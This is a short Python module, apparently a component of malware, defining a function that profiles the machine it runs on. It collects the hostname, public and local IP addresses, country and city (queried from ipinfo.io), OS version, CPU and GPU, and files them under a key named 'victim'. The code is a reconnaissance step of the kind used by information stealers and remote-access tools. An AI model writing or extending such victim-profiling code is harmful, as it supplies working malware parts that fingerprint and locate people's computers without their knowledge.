import cpuinfo, GPUtil, requests, socket
from platform import uname


def get_host_info() -> dict:
    ipinfo = requests.get('http://ipinfo.io/json').json()
    gpus = GPUtil.getGPUs()
    hostname = socket.gethostname()

    return {
        'victim': {
            'hostname': hostname,
            'public_ip': ipinfo['ip'],
            'local_ip': socket.gethostbyname(hostname),
            'geo': {'country': ipinfo['country'], 'city': ipinfo['city']},
            'os': f'{uname().system} {uname().release} {uname().version}',
            'cpu': cpuinfo.get_cpu_info()['brand_raw'],
            'gpu': gpus[0].name if gpus else None
        }
    }
